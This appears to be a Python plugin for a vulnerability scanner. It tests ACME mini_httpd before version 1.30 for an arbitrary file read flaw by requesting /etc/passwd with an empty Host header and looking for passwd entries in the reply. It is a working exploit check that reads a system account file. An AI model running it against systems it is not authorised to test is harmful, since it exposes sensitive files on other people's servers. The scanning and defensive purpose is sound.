#!/usr/bin/env python 
# -*- coding:utf-8 -*-

import requests

def get_plugin_info():
    plugin_info = {
        "name": "ACME mini_httpd任意文件读取漏洞",
        "info": "ACME mini_httpd 1.30之前版本中存在安全漏洞。远程攻击者可利用该漏洞读取任意文件。(例：GET /etc/passwd)。",
        "level": "h",
        "type": "任意文件读取",
        "url": "https://www.anquanke.com/post/id/163103",
        "feature": "none",
        "is_web": 1,
        "is_pwd": 0,
        "solution": "1、在打补丁前，应限制问题设备的互联网访问权限。2、安装最新的版本，新版本官网下载地址：http://www.acme.com/software/mini_httpd/"
    }
    return plugin_info


def check(ip, port, timeout, is_debug=True, task_id=-1):
    try:
        payload = "/etc/passwd"   # 读取的文件
        url = "http://" + ip + ":" + str(port) + payload
        # print url
        headers = {
            'Host': '',    # Host为空
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Accept-Language': 'en',
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Connection': 'close',
        }
        r = requests.get(url, headers=headers, timeout=timeout)
        r.encoding = "utf-8"
        data = r.text
        # print data
        if 'root:' in data and 'nobody:' in data:
            return u"ACME mini_httpd arbitrary files read holes"
    except:
        pass

# 以下为本地测试代码
# if __name__ == "__main__":
#     str = check("192.168.166.10", "8080", 3,)
#     if (str):
#         print str
#     else:
#         print u"不存在此漏洞"